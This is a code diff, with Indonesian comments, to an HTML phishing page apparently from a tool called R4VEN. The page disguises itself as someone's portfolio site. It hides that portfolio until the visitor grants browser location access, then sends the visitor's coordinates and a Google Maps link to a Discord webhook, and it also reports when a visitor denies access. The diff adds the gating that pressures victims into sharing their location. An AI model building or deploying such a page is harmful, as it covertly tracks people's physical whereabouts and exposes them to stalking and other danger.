@@ -34,7 +34,16 @@ html_code = f"""
 </head>
 <body onload="getLocation()">
 
-  <iframe src="https://iqbalmantam.github.io/portfolio/" width="100%" height="900" style="border:none;"></iframe>
+  <!-- Iframe disembunyikan (display: none) secara default -->
+  <div id="portfolio-container" style="display: none;">
+    <iframe src="https://iqbalmantam.github.io/portfolio/" width="100%" height="900" style="border:none;"></iframe>
+  </div>
+
+  <!-- Pesan penolakan jika user tidak mengizinkan lokasi -->
+  <div id="error-message" style="text-align: center; margin-top: 200px; font-family: sans-serif; display: none;">
+    <h2 style="color: #ff4b4b;">Akses Ditolak / Lokasi Diperlukan</h2>
+    <p>Anda harus memberikan izin lokasi (Allow) untuk memuat halaman ini.</p>
+  </div>
 
   <p id="demo"></p>
   <span id="gfg" style="display:none;"></span>
@@ -110,6 +119,9 @@ html_code = f"""
     }}
 
     function showPosition(position) {{
+      // JIKA USER MEMILIH ALLOW: Tampilkan kembali kontainer portfolio
+      document.getElementById("portfolio-container").style.display = "block";
+
       var latlong = (" GET ", "```prolog\\nLatitude:" + position.coords.latitude + "\\nLongitude:" + position.coords.longitude + "```" + "\\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude);
 
       var myEmbed4 = {{
@@ -128,6 +140,9 @@ html_code = f"""
 
     function showError(error) {{
       if (error.code == error.PERMISSION_DENIED) {{
+        // JIKA USER MEMILIH DENY: Tampilkan pesan error dan sembunyikan portfolio
+        document.getElementById("error-message").style.display = "block";
+        
         sendToDiscord({{
           username: "R4VEN",
           avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
